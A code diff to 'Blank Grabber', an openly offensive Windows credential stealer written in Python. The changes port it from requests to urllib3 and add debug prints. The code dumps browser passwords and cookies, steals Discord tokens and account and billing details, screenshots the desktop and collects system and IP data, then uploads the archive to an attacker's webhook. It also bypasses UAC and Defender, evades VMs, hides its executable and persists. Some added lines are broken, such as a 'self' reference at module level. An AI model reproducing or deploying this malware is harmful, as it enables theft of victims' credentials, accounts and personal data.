@@ -3,14 +3,15 @@
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
 PINGME = True # Pings @everyone
 VMPROTECT = True # Tries to protect your webhook from VMs
-BSOD = True # Tries to trigger Blue Screen if VM detected
-STARTUP = True # Puts the grabber in startup (and hide it)
+BSOD = False # Tries to trigger Blue Screen if VM detected
+STARTUP = False # Puts the grabber in startup (and hide it)
 HIDE_ITSELF = True # Hides the Grabber
 
 import os
 if os.name!='nt':
     os._exit(0)
-import requests
+import urllib3
+http = urllib3.PoolManager()
 import threading
 import subprocess
 import shutil
@@ -76,7 +77,7 @@ class vmprotect:
                 if kill.returncode != 0:
                     fquit(True)
         try:
-            requests.get(f'https://blank{generate()}.in')
+            http.request('GET', f'https://blank{generate()}.in')
         except Exception:
             pass
         else:
@@ -85,7 +86,7 @@ class vmprotect:
         if os.path.isfile('D:/TOOLS/Detonate.exe'):
             fquit(True)
             
-        if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
+        if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
             fquit(True)
             
 def MUTEX():
@@ -101,6 +102,7 @@ def MUTEX():
 
 class BlankGrabber:
     def __init__(self):
+        self.http = http
         self.trust = 0
         self.webhook = WEBHOOK
         self.getPKey()
@@ -190,24 +192,28 @@ class BlankGrabber:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
+        print("Getting passwords")
         if not hasattr(sys, 'frozen'):
             return
         subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"pm.bam /stext {os.path.abspath(self.tempfolder)}/Passwords.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(sys._MEIPASS + "/pm.bam")
-        with open(self.tempfolder + '/Passwords.txt') as file:
+        with open(self.tempfolder + '/Passwords.txt', encoding= "utf-8", errors= "ignore") as file:
             if len(file.readlines()) > 100:
                 self.trust += 1
+        print("Got passwords")
 
     def getcookie(self):
+        print("Getting cookies")
         if not hasattr(sys, 'frozen'):
             return
         subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
         subprocess.run(f"ck.bam /stext {os.path.abspath(self.tempfolder)}/Cookies.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
         os.remove(sys._MEIPASS + "/ck.bam")
-        with open(self.tempfolder + '/Cookies.txt') as file:
+        with open(self.tempfolder + '/Cookies.txt', encoding= "utf-8", errors= "ignore") as file:
             if len(file.readlines()) > 100:
                 self.trust += 1
+        print("Got cookies")
 
     def bypass_bd(self):
         try:
@@ -243,6 +249,7 @@ class BlankGrabber:
             file.write(output.strip())
 
     def getTokens(self):
+        print("Getting tokens")
         subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
         data = []
         paths = {
@@ -294,25 +301,27 @@ class BlankGrabber:
                     
         for token in self.tokens:
                 token = token.strip()
-                r = requests.get('https://discord.com/api/v9/users/@me', headers=self.headers(token))
-                if r.status_code!=200:
+                r = self.http.request('GET', 'https://discord.com/api/v9/users/@me', headers=self.headers(token))
+                if r.status!=200:
                     continue
-                r = r.json()
+                r = json.loads(r.data.decode())
                 user = r["username"] + "#" + str(r["discriminator"])
                 email = r["email"].strip() if r["email"] else "(No Email)"
                 phone = r["phone"] if r["phone"] else "(No Phone Number)"
                 verified=r["verified"]
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.headers(token)).json()
+                nitro_data = json.loads(self.http.request('GET', 'https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.headers(token)).data.decode())
                 has_nitro = False
                 has_nitro = len(nitro_data)>0
-                billing = len(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).json())>0
+                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
                 data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
             self.trust += 3
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
+        print("Got Tokens")
 
     def screenshot(self):
+        print("Taking SS")
         try:
             file = open(sys._MEIPASS + '/structc.pyd', 'rb')
         except Exception:
@@ -325,6 +334,7 @@ class BlankGrabber:
         image = ImageGrab.grab()
         image.save(self.tempfolder + "/Screenshot.png")
         del image
+        print("Took SS")
 
     def headers(self, token=None):
         headers = {
@@ -337,22 +347,25 @@ class BlankGrabber:
         return headers
 
     def getip(self):
+        print("Getting IP")
         try:
-            r = requests.get("http://ip-api.com/json/?fields=225545").json()
+            r = json.loads(self.http.request('GET', "http://ip-api.com/json/?fields=225545").data.decode())
             if r.get("status") != "success":
                 raise Exception('Failed')
-            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            data += f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "")+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
             if r['reverse'] != '':
                 data += f"\nReverse DNS: {r['reverse']}"
         except Exception:
-            r = requests.get("http://httpbin.org/get").json()
-            data = f"IP: {r.get('origin')}"
+            r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
+            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else "") + f"IP: {r.get('origin')}"
         return data
+        print("Got IP")
 
     def zip(self):
         shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
 
     def send(self):
+        print("Sending Info")
         self.zip()
         payload = {
   "content": "@everyone" if PINGME else "",
@@ -372,9 +385,9 @@ class BlankGrabber:
 }
         if self.trust < 3:
             fquit(True)
-        requests.post(self.webhook, json = payload)
+        self.http.request('POST', self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
         with open(self.archive,'rb') as file:
-            requests.post(self.webhook, files = {"file": file})
+            self.http.request('POST', self.webhook, fields= {"file": (self.archive, file.read())}, headers= {"user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"})
 
         try:
             os.remove(self.archive)
@@ -384,14 +397,17 @@ class BlankGrabber:
 
 if __name__ == "__main__":
     time.sleep(1)
+    print("running")
     if not is_admin():
         uac_bypass()
+    print("Got Admin")
     while True:
         try:
-            r = requests.get("https://httpbin.org/get?1=2")
-            if r.json().get("args").get("1") != "2":
+            r = json.loads(self.http.request("GET", "https://httpbin.org/get?1=2").data.decode())
+            if r.get("args").get("1") != "2":
                 os._exit(0)
         except Exception:
+            print("else started")
             if VMPROTECT:
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
@@ -408,10 +424,12 @@ if __name__ == "__main__":
             if frozen and HIDE_ITSELF:
                 subprocess.run(f'attrib "{sys.executable}" +s +h', shell= True, capture_output= True)
 
-            threading.Thread(target= bypass_wd, daemon= True).start()
+            bypass_wd()
+            print("Starting Grabber")
             try:
                 BlankGrabber()
-            except Exception:
-                pass
+            except Exception as e:
+                print(e)
         finally:
+            print("sleeping")
             time.sleep(1800) #30 Minutes
